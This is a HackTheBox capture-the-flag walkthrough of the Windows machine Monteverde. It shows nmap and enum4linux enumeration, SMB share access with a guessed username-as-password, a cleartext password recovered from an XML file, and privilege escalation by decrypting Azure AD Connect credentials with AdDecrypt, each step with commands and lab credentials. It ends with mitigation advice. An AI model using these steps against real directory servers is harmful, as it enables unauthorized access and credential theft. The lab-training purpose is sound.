# Monteverde

![](images/info.PNG)

__Task__: Find [user.txt](#user-flag) and [root.txt](#root-flag)

### Penetration Methodologies

__Scanning__

- nmap

__Enumeration__

- enum4linux

- SMB Share enumeration

__Exploitation__

- Weak password policy

- Stored plaintext password

__Priv Esc__

- Azure AD Connect Service Privileged Account 

***

This is my write-up for the HackTheBox Windows machine _Monteverde_.

## User Flag

My first step is to run my `nmap` scan. _Monteverde_ is running a lot of services, which may indicate a Active Directory DC. 

- __sC__: Enable common scripts

- __sV__: version and service on the port 

- __O__: remote OS detection using fingerprinting

```
# Nmap 7.80 scan initiated Thu May 28 15:05:20 2020 as: nmap -O -sV -sC -oN init172.txt 10.10.10.172
Nmap scan report for 10.10.10.172
Host is up (0.059s latency).
Not shown: 989 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain?
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2020-05-28 19:18:38Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.80%I=7%D=5/28%Time=5ED01992%P=x86_64-pc-linux-gnu%r(DNSV
SF:ersionBindReqTCP,20,"\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version\
SF:x04bind\0\0\x10\0\x03");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -46m55s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2020-05-28T19:21:03
|_  start_date: N/A

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 28 15:10:35 2020 -- 1 IP address (1 host up) scanned in 315.60 seconds
```

After the results come back, I also run a full port scan to see if any additional ports may be open. 

```bash
$ nmap -O -sV -sC -p- -oN full172.txt 10.10.10.172
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

The port that I make note of from the full scan is 5985. This tells me that the box is running `WinRM 2.0 (Microsoft Windows Remote Management)`. Once I find some credentials, I may be able to gain a foothold through this service.

Next, I run `enum4linux`, a tool primarily used to enumerate Windows or Samba systems.

```bash
$ enum4linux -U -o 10.10.10.169
```

One of the most crucial items I receive from `enum4linux` are users on the system. Two users stand out and our not like the others: AAD__987d7f2f57d2 and SABatchJobs. 

![](images/enum-users.png)

More enumeration doesn't yield much information and I don't have any potential passwords. HackTheBox doesn't generally encourage bruteforcing credentials, so I decide to use the two usernames from earlier as their own passwords. 

I have two potential services that accept logins, `SMB` and `WinRM`. I'll first try `SMB`. I can use `smbclient` to [enumerate shares](https://www.computerhope.com/unix/smbclien.htm) on _Monteverde_, but only if I have valid credentials. Fortunately, using the command and credentials below, I can sucessfully view the available shares.

```bash
$ smbclient -L 10.10.10.172 -U SABatchJobs%SABatchJobs
```

The available shared resources are displayed. I can now enumerate some of the file system. 

![](images/shares.png)

I connect to the various shares with `smbclient`.

```bash
$ smbclient \\\\10.10.10.172\\users$ -U SABatchJobs%SABatchJob
```

Within the `users$` share I find multiple user folders. As I poke around I discover that the user mhope has an interesting xml file. I retrieve it using the `get` command and find a password stored in cleartext.

```xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>
```

I can only assume that this belongs to the user mhope. With luck, this user also uses the same password across services. I leave the shares behind for now and return to attempt remote access using `WinRM`. 

With the help of `evil-winrm`, a Windows Remote Management tool for pentesting, I gain a foothold on the machine.

```bash
$ evil-winrm -i 10.10.10.172 -u mhope -p '4n0therD4y@n0th3r$'
```

On the user's desktop, I find my first flag!

![](images/user-flag.png)

## Root Flag

Now that I have remote access to a user on the system, I need to see what permissions this account has and what groups they are apart of. I use the command `net user` to start.

```powershell
> net user mhope
[...]
Global Group memberships     *Azure Admins         *Domain Users
```

I omitted some of the results, but it looks like the user mhope is apart of the `Azure Admins` group. After some research on a potential CVE, I found [this article](https://vbscrub.com/2020/01/14/azure-ad-connect-database-exploit-priv-esc/), which provides great information on an exploit that allows a user to retrieve plaintext credentials of the privileged account being utilized by the Azure AD Connect.

I downloaded the two files `AdDecrypt.exe` and `mcrypt.dll` and uploaded them to _Monteverde_ using the built-in feature on `evil-winrm`.

![](images/uploads.png)

Afterwards, I navigate to the `Microsoft Azure AD Sync\Bin` directory, and run the executable. 

```powershell
> cd “C:\Program Files\Microsoft Azure AD Sync\Bin”
> C:\Users\mhope\AdDecrypt.exe -FullSQL
```

Pretty quickly I receive credentials. Fortunately for me, they are for the administrator account!

```
======================
AZURE AD SYNC CREDENTIAL DECRYPTION TOOL
Based on original code from: https://github.com/fox-it/adconnectdump
======================

Opening database connection...
Executing SQL commands...
Closing database connection...
Decrypting XML...
Parsing XML...
Finished!

DECRYPTED CREDENTIALS:
Username: administrator
Password: d0m@in4dminyeah!
Domain: MEGABANK.LOCAL
```

I once again connect to the machine, this time with my newly attained credentials.

```bash
$ evil-winrm -i 10.10.10.172 -u administrator -p 'd0m@in4dminyeah!'
```

I navigate to the Administrator desktop and collect the flag. _Monteverde_ rooted!

![](images/root-flag.png)


***

### Mitigation

- Don't use default or weak passwords, specifically, enforce strong policies, even on service accounts (especially on service accounts)

- Patch management; Azure AD Connect should be updated when patches are available and proved stable. 

- Additionally, the accounts used for services should be dedicated service accounts and not an administrator account (principle of least privilege).

### Final Thoughts

This was a fun box. At the time of this write-up, `SMB` is not one of my strengths, and I enjoy learning new ways of interacting with it. I also liked enumerating the machine, I can never get enough Windows enumeration. The password discovery at the beginning also felt realistic, lazy administrators may not consider the consequences of poor password practices on service accounts.